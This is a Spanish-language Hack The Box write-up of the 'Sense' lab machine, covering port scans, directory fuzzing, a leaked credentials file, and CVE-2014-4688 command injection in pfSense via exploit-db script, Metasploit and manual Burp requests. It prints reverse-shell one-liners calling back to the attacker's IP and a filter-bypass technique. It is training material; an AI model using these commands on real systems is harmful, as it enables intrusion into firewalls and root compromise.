---
title: "Sense - Hack The Box"
date: 2023-03-08
draft: false
slug: "htb-writeup-sense"
excerpt: "Esta fue una máquina que jugó un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que distraerme un poco en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio pfSense y se utilizó un Exploit CVE-2014-4688 para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "pfSense", "Fuzzing", "Information Leakage", "Command Injection (CI)", "CVE-2014-4688 (CI)", "BurpSuite", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "burpsuite"
  - "nc"
  - "metasploit framework(msfconsole)"
  - "meterpreter"
  - "Módulo: exploit/unix/http/pfsense_graph_injection_exec"
links:
  - "http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122"
  - "https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/"
  - "https://www.exploit-db.com/exploits/38780"
  - "https://www.exploit-db.com/exploits/34113"
  - "https://www.exploit-db.com/exploits/43560"
  - "https://www.weweb.cat/es/silverstripe-cms/"
  - "https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/"
  - "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
  - "https://www.youtube.com/watch?v=mWTmXpQlgCs"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-sense/sense_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.60                                                                                     
PING 10.10.10.60 (10.10.10.60) 56(84) bytes of data.
64 bytes from 10.10.10.60: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.10.10.60: icmp_seq=2 ttl=63 time=130 ms
64 bytes from 10.10.10.60: icmp_seq=3 ttl=63 time=131 ms
64 bytes from 10.10.10.60: icmp_seq=4 ttl=63 time=131 ms

--- 10.10.10.60 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 130.494/131.036/131.810/0.483 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:43 CST
Initiating SYN Stealth Scan at 13:43
Scanning 10.10.10.60 [65535 ports]
Discovered open port 80/tcp on 10.10.10.60
Discovered open port 443/tcp on 10.10.10.60
Increasing send delay for 10.10.10.60 from 0 to 5 due to 11 out of 16 dropped probes since last increase.
Completed SYN Stealth Scan at 13:44, 30.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.60
Host is up, received user-set (0.61s latency).
Scanned at 2023-03-08 13:43:35 CST for 31s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.87 seconds
           Raw packets sent: 131088 (5.768MB) | Rcvd: 18 (792B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo únicamente dos puertos activos, el que ya conocemos el puerto HTTP y otro. Veamos que nos dice el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p80,443 10.10.10.60 -oN targeted                          
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:45 CST
Nmap scan report for 10.10.10.60
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35

|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35

|_ssl-date: TLS randomness does not represent time
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Supongo que al entrar en la página web nos redirigirá al puerto 443, igualmente vemos que usan un servicio versión **lighthttpd 1.4.35**. Veamos que nos dice la página.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos a ver que show.

Justamente, cuando ponemos la IP nos dice que hay riesgo por el certificado, etc., dando en aceptar el riesgo nos va a redirigir a un login.

![](/assets/images/htb-writeup-sense/Captura1.png)

Se puede ver algo llamado **PF Sense**, supongo que es el servicio que usa la página, antes de investigarlo, veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura2.png">
</p>

Ahí vemos el servidor web y la página usa PHP, ahora investiguemos el servicio.

| **Servicio PfSense** |
|:-----------:|
| *pfSense es una distribución personalizada de FreeBSD adaptado para su uso como Firewall y Enrutador. Se caracteriza por ser de código abierto, puede ser instalado en una gran variedad de ordenadores, y además cuenta con una interfaz web sencilla para su configuración.* |

Ósea que es un **Firewall**, intentemos entrar con credenciales por defecto, estas son:
* Username: *admin*
* Contraseña: *pfsense*

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura4.png">
</p>

No pues no sirvió, mejor hagamos un **Fuzzing** para saber que subpáginas tiene. 

**OJO**, se tiene que cambiar el comando porque saldrán muchos 301, para solucionarlo le agregamos la **-L**.

### Fuzzing {#Fuzz}

```bash
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.60/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000014:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     
000003597:   200        228 L    851 W      7492 Ch     "tree"                                                                      
000008057:   200        173 L    404 W      6113 Ch     "installer"                                                                 
000045240:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     

Total time: 1527.095
Processed Requests: 220560
Filtered Requests: 220543
Requests/sec.: 144.4310
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-L*       | Para que wfuzz siga las redirecciones que surjan en el fuzzing. |	

Ahora probemos con **Gobuster**:
```bash
gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345]
Progress: 220555 / 220561 (100.00%)
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-k*       | Para indicar que se deshabilite la comprobación de certificados |

Excelente, veo 2 directorios interesantes que son **installer** y **tree**, pero **installer** no servirá de mucho porque no nos muestra nada, así que vamos directamente con **tree**:

![](/assets/images/htb-writeup-sense/Captura5.png)

**SilverStripe** parece ser un servicio, vamos a investigarlo:

| **Servicio SilverStripe** |
|:-----------:|
| *SilverStripe es un sistema de gestión de contenidos (CMS) basado en PHP que presenta una agradable y moderna interfaz de usuario y simplifica bastante la construcción de un sitio web profesional. SilverStripe es una herramienta gratuita que nos permite crear y administrar sitios web a través de una interfaz muy limpia y sencilla de utilizar. Se pueden crear menús y apartados de forma rápida e intuitiva, así como añadir contenidos (texto, imágenes, archivos …).* |

Entonces, el **servicio SilverStripe** es un gestor de archivos de texto, fotos, etc., que se me hace que podemos listar esos archivos especificándolos en el **Fuzzing**, vamos a buscar si existen archivos de texto.

### Buscando Archivos de Texto con Fuzzing {#Fuzz2}

Vamos a intentarlo con **wfuzz** y luego con **gobuster**:
```bash
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ.txt/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.60/FUZZ.txt/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000001268:   200        9 L      40 W       271 Ch      "changelog"                                                                 
000120222:   200        6 L      12 W       106 Ch      "system-users"                                                              

Total time: 1952.265
Processed Requests: 220560
Filtered Requests: 220545
Requests/sec.: 112.9764
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-L*       | Para que wfuzz siga las redirecciones que surjan en el fuzzing. |

Excelente, ahora tratemos con **gobuster**:

```bash
gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -k -x txt,php,conf
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php,conf
[+] Timeout:                 10s
===============================================================
/index.php            (Status: 200) [Size: 6690]
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/stats.php            (Status: 200) [Size: 6690]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
/edit.php             (Status: 200) [Size: 6689]
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/license.php          (Status: 200) [Size: 6692]
/system.php           (Status: 200) [Size: 6691]
/status.php           (Status: 200) [Size: 6691]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/changelog.txt        (Status: 200) [Size: 271]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/exec.php             (Status: 200) [Size: 6689]
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
/graph.php            (Status: 200) [Size: 6690]
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
/wizard.php           (Status: 200) [Size: 6691]
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
/pkg.php              (Status: 200) [Size: 6688]
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
/xmlrpc.php           (Status: 200) [Size: 384]
/reboot.php           (Status: 200) [Size: 6691]
/interfaces.php       (Status: 200) [Size: 6695]
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
/system-users.txt     (Status: 200) [Size: 106]
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-k*       | Para indicar que se deshabilite la comprobación de certificados. |
| *-x*       | Para especificar las extensiones de archivos que va a buscar durante el fuzzing. |

Aparece un archivo llamado **Changelog**, veamos si podemos verlo:

![](/assets/images/htb-writeup-sense/Captura6.png)

| **Traducción** |
|:-----------:|
| *Hubo un fallo al actualizar el Firewall, es necesario un parcheo manual. Se han mitigado 2 de 3 vulnerabilidades, los parches faltantes, serán puestos en la siguiente ventana de mantenimiento.* |

Después de leer el mensaje que nos apareció, sabemos que hay una vulnerabilidad que aún no han parchado. 

Bien, pero lo que nos interesa ahorita, es saber si podemos acceder a la página web para poder obtener la versión del **pfSense** y con eso podamos usar un Exploit.

Aunque tambien podemos buscar un Exploit para el **servicio SilverStripe**. Pero, vamos a ver el otro archivo que se encontró, el **system-users**.

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura7.png">
</p>

Muy bien, ya tenemos un usuario y está usando la contraseña por defecto del **servicio pfSense**, intentemos entrar:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura8.png">
</p>

¡Excelente! Ya estamos dentro:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura9.png">
</p>

Ahí está la versión del **pfSense**, ahora podemos buscar un Exploit para este servicio.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando un Exploit para pfSense {#PruebaExp}

Como ya encontramos la versión de **pfSense** que está ocupando la máquina víctima, vamos a buscar un Exploit adecuado que nos ayude a acceder a la máquina:

```bash
searchsploit pfsense 2.1.3                                                                               
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                             | php/webapps/43560.py

|---|---|
Shellcodes: No Results
Papers: No Results
```
Solo nos aparece un Exploit, así que vamos a analizarlo para ver cómo usarlo contra la máquina.

#### Probando Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection {#PruebaExp2}

Copia el Exploit en tu espacio de trabajo:
```bash
searchsploit -m php/webapps/43560.py 
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
    Codes: CVE-2014-4688
 Verified: False
File Type: Python script, ASCII text executable
```

Después de ver el contenido del Exploit, nos pide los siguientes parámetros:
```python
rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password
```

Incluso si lo ejecutamos, nos dirá como usarlo pues ya tiene permisos de ejecución:
```bash
./PFSense_Exploit.py -h
usage: PFSense_Exploit.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT] [--username USERNAME] [--password PASSWORD]

options:
  -h, --help           show this help message and exit
  --rhost RHOST        Remote Host
  --lhost LHOST        Local Host listener
  --lport LPORT        Local Port listener
  --username USERNAME  pfsense Username
  --password PASSWORD  pfsense Password
```
Muy bien, pongamos lo que pide y activémoslo.

Hagamoslo por pasos:

* Activamos una **netcat**
```bash
nc -nvlp 443                                  
listening on [any] 443 ...
```

* Usamos el Exploit:
```bash
./PFSense_Exploit.py --rhost 10.10.10.60 --lhost Tu_IP --lport 443 --username rohit --password pfsense
```

* Resultado:
```bash
nc -nvlp 443                                  
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 46858
sh: can't access tty; job control turned off
# whoami
root
```
Excelente, este Exploit nos conecta directamente como **usuario root**.

### Ganando Acceso con Metasploit Framework {#PruebaExp3}

Esta parte es muy simple, pues vamos a utilizar el mismo Exploit, pero en **Metasploit**.

Vamos por pasos:

* Inicia **Metasploit**:
```bash
msfconsole
```

* Busca un Exploit para **pfSense**:

```bash
msf6 > search pfsense
.
Matching Modules
================
.
   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
   1  exploit/unix/http/pfsense_diag_routes_webshell  2022-02-23       excellent  Yes    pfSense Diag Routes Web Shell Upload
   2  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
   3  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE
   4  exploit/unix/http/pfsense_pfblockerng_webshell  2022-09-05       excellent  Yes    pfSense plugin pfBlockerNG unauthenticated RCE as root
.
.
Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/http/pfsense_pfblockerng_webshell
```

* Usa el módulo número 2:
```bash
msf6 > use exploit/unix/http/pfsense_graph_injection_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/pfsense_graph_injection_exec) >
```

* Configura el módulo:
```bash
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set RHOSTS 10.10.10.60
RHOSTS => 10.10.10.60
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(unix/http/pfsense_graph_injection_exec) > set USERNAME rohit
USERNAME => rohit
```

* Ejecuta el módulo:
```bash
msf6 exploit(unix/http/pfsense_graph_injection_exec) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Payload uploaded successfully, executing
[*] Sending stage (39927 bytes) to 10.10.10.60
[+] Deleted jMWBmhjO
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.60:45246)
.
meterpreter > sysinfo
Computer    : pfSense.localdomain
OS          : FreeBSD pfSense.localdomain 8.3-RELEASE-p16 FreeBSD 8.3-RELEASE-p16 #0: Thu May  1 16:19:14 EDT 2014     root@pf2_1_1_amd64.pfsense.org:/usr/obj.amd64/usr/pfSensesrc/src/sys/pfSense_SMP.8 amd64
Meterpreter : php/freebsd
meterpreter > shell
Process 16138 created.
Channel 0 created.
whoami
root
```
Listo, ganamos acceso con **Metasploit**.

### Inyectando Comandos en status_rrd_graph_img.php de pfSense {#PruebaExp4}

Existe un blog que explica como inyectar comandos en un **archivo PHP** de **pfSense**, te lo comparto:
* <a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank">PfSense Vulnerabilities Part 2: Command Injection</a>

De acuerdo al blog, nosotros podemos usar el **archivo status_rrd_graph_img.php** para inyectar comandos, dentro de ese script, la variable **exec()** es la que presenta la vulnerabilidad, entonces, según el blog podemos usar el **parámetro queues** para inyectar nuestro comando, dentro del **parámetro GET database**. 

Vamos a tratar de inyectar un comando de prueba, siguiendo los pasos que menciona el blog:

* Captura una sesión con **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura10.png">
</p>

* Envia la captura al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura11.png">
</p>

* Vamos a replicar lo mismo que hicieron en el blog, pondremos los comandos para crear un **archivo txt**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura12.png">
</p>

* Entra en la URL para ver el archivo de texto:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura13.png">
</p>

De esta forma comprobamos que, podemos inyectar comandos, vamos a intentar conectarnos a la máquina inyectando una **Reverse Shell**.

-------

**IMPORTANTE**: Por lo que entiendo del blog, es necesario que la inyección sea usando bash, es decir, que no podemos incluir un **archivo PHP** con una **cmd** como lo hemos hecho antes. E incluso, parece que estamos limitados en cuanto a caracteres se refiere, pues uno de los caracteres que impedira la ejecución de nuestros comandos, será el **slash (/)**, por lo que debemos buscar una alternativa y ver si hay otros caracteres que impediran la ejecución de nuestros comandos.

------

Para lograr esto, podemos utilizar **netcat** con el fin de ver que caracteres y comandos funcionan, ya que ni el código fuente ni el render, nos muestran si fue correcta nuestra inyección.

Esto igual lo haremos por pasos:

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Probemos a mandar un **comando whoami** a nuestra **netcat**:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura14.png">
</p>

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 2768
root
```
Excelente, de momento funciona.

Para no alargar más esta parte del blog, te cuento que los caracteres que no funcionan son: **slash(/), ampersand(&) y el guion (-)**.

Para el caso del **slash(/)**, podemos usar el **comando env**, para poder ver las variables de entorno que tiene la máquina víctima:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura15.png">
</p> 

Observa el resultado:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 63944
OLDPWD=/
HOME=/
PHP_FCGI_MAX_REQUESTS=500
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin
LANG=en_US.ISO8859-1
PHP_FCGI_CHILDREN=1
PWD=/var/db/rrd
```

Entonces, si usamos **HOME** dentro de nuestra inyección, será igual al **slash(/)**, probemoslo:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura16.png">
</p>

```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 10532
/
```
Y listo, de esta forma podemos usar el **slash(/)**, para el **ampersand(&) y guion(-)** la cosa cambia, porque no tenemos una variable de entorno a la cual referenciar. Para solucionar esto, podemos usar su código ASCII dentro de una varible de bash, lo que permitira usar estos dos caracteres.

* Para el **ampersand(&)** en **ASCII** es: *\046*

* Para el **guion(-)** en **ASCII** es: *\055*

Intenta a meterlos en una variable cada uno, y ejecutalo en una inyección de comandos para ver si funcionan:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura17.png">
</p>

```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 38798
- &
```

Excelente, ahora solo es cuestión de ocupar una **Reverse Shell** que nos permita ganar acceso a la máquina, suplantando los caracteres especiales que no interpreta por lo que ya tenemos.

En mi caso, probe las siguientes:
```bash
-> bash -i >& /dev/tcp/Tu_IP/443 0>&1

-> nc Tu_IP 443 -e bash

-> exec 5<>/dev/tcp/Tu_IP/443;cat <&5 | while read line; do $line 2>&5 >&5; done
```

Y ninguna funciono a excepción de esta:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc Tu_IP 443 >/tmp/f
```
Quiero pensar, que esta se acomoda perfectamente a como funciona la vulnerabilidad encontrada, pues mencionan algo de que se va a ejecutar cualquier comando que inyectes, después del **comando rm** del **script status_rrd_graph_img.php** hasta que metas un **slash(/)**, que es cuando ya no se ejecuta nada.

Probemos esta **Reverse Shell**, por pasos:

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Utiliza la **Reverse Shell** que mencione y cambia los caracteres especiales, por los que encontramos:

<p align="center">
<img src="/assets/images/htb-writeup-sense/Captura18.png">
</p>

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.60] 4360
whoami
root
id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
Y listo, hemos vuelto a ganar acceso y completado la máquina.
